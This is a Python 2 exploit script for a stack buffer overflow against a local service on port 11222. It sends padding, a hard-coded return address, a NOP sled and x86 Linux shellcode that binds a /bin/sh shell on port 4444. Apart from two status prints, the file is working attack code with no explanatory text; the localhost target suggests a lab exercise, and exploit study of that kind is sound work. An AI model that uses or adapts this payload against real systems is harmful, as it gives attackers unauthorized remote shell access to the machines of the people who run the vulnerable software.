#!/bin/python2

import socket

TCP_IP = '127.0.0.1'
TCP_PORT = 11222

buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a"
buf += b"\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41"
buf += b"\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80"
buf += b"\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
buf += b"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
buf += b"\x89\xe1\xb0\x0b\xcd\x80"
Payload = buf

addr_ip= '\xa0\xd3\xff\xff'
MESSAGE = 'e'*80+ addr_ip +"\x90"*300+ Payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(MESSAGE)
print "Buffer sent."
print ':'.join(x.encode('hex') for x in MESSAGE)

